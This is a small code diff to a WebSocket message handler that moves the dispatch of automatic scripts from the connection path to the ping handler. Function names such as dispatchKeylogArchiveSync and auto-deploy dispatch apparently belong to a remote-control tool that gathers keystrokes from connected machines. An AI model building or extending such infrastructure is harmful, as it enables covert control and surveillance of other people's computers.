@@ -1135,7 +1135,6 @@ export async function handleWebSocketMessage(
 
         const reconnectedWithinGrace = cancelPendingOffline(infoObj.id);
 
-        deps.dispatchAutoScriptsForConnection(infoObj, ws);
         deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
         deps.dispatchKeylogArchiveSync?.(infoObj.id, ws);
@@ -1183,6 +1182,7 @@ export async function handleWebSocketMessage(
       }
       case "ping":
         handlePing(client, payload as Ping, ws);
+        deps.dispatchAutoScriptsForConnection(client, ws);
         break;
       case "pong":
         handlePong(client, payload);
